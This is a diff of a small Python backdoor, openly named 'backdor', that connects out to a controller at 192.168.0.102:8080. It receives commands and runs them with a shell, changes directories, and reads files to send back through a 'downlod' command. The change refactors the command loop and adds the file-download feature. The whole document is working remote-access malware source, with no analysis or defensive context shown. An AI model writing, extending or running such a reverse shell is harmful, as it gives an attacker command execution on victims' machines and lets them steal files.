@@ -2,7 +2,7 @@ import socket
 import subprocess
 import sys
 import os
-import json
+
 
 class backdor:
     '''define a class'''
@@ -16,42 +16,46 @@ class backdor:
         '''define a function'''
         return subprocess.check_output(commnd, shell=True)
 
-    def command_send(self):
+    def command_send(self, deta):
         '''define a function in this function send data in server client'''
-        self.connected.send(self.data)
+        self.connected.send(deta)
 
     def command_receive(self):
         '''receive command use this function'''
-        md = self.connected.recv(1024)
-        self.command = md.decode()
-        self.data = self.use_for_system_command(self.command)
-        
+        return self.connected.recv(1024)
 
-    def brack(self):
-        '''this function use to program exit'''
-        if self.command=='exit':
-            self.connected.close()
-            sys.exit()
-
-    def change_dir(self, pta):
-        '''This Function is used to change the current directory'''
-        get_pt = os.getcwd()
-        str_pt = pta
-        create_pat = os.path.join(get_pt, str_pt)
-        os.chdir(create_pat)
+    def change_dir(self, path):
+        '''this function use to for change the working directory'''
+        os.chdir(path)
         return os.getcwd()
-        
 
+    def read_file(self, file_path):
+        '''this function use to open a txt file use to binary mode'''
+        with open(file_path, "rb") as bin:
+            return bin.read()
 
     def run(self):
-        '''all function call in this run function'''
+        '''this function use to run all auto function'''
         while True:
-            command = self.command_receive()
-            self.brack()
-            self.command_send()
-            if self.command.startswith("cd "):
-                self.command_result = self.change_dir(command)
-
+            comd = self.command_receive().decode()      
+            if comd.split()[0]=="exit":
+                self.connected.close()
+                sys.exit()
+            elif comd.split()[0]=="cd":
+                try:
+                    respoce_client = self.change_dir(comd[3:]).encode()
+                except FileNotFoundError:
+                    respoce_client = f"The system cannot find the file specified:{comd[3:]}".encode()
+            elif comd.split()[0]=="downlod":
+                file_name = len(comd.split()[0])
+                try:
+                    respoce_client = self.read_file(comd[file_name:])
+                except FileNotFoundError:
+                    respoce_client = f" No such file or directory:{comd[file_name:]}".encode()
+            else:
+                respoce_client = self.use_for_system_command(comd)
+     
+            self.command_send(respoce_client)
 
 
 dor = backdor("192.168.0.102", 8080)
